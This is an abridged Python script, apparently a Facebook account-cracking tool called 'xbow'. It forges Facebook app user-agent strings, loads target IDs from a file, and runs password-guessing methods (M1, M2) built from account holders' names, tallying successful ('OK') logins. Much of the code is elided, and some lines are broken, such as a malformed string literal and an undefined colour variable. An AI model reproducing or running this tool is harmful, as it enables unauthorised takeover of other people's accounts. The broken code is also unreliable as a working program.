...
#__________xbow_UA_ZONE____________#
...
def S1():
	...
	e = '[Dalvik/2.1.0 (Linux; U; Android 12; vivo 1938 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243062;FBCR/Robi;FBMF/vivo;FBBD/vivo;FBDV/vivo 1938;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1411};FB_FW/1;]'
	ua = e
	#print(ua)
	return ua 
...
def S2():
	...
	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = '[FBAN/FB4A;FBAV/315.0.0.42.122;FBBV/960213045;FBDM/{density=2.5,width=720,height=1600};FBLC/en_US;FBRV/960213045;FBCR/Grameenphone;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Hot 10 Play;FBSV/10.0.0;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]'
	ua = s + e
	#print(ua)
	return ua 
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/MR.xbow.404');menu()
    elif select =='0':
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}➣{green} /sdcard/xbow.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{rad}[{green}xbow-M1{rad}]{white}-{rad}[{gren}{loop}{rad}]{white}-{rad}[{green}OK{rad}]{white}-{rad}[{green}{len(oks)}{rad}] ") 
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{rad}[{green}xbow-M2{rad}]{white}-{rad}[{gren}{loop}{rad}]{white}-{rad}[{green}OK{rad}]{white}-{rad}[{green}{len(oks)}{rad}] ") 
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
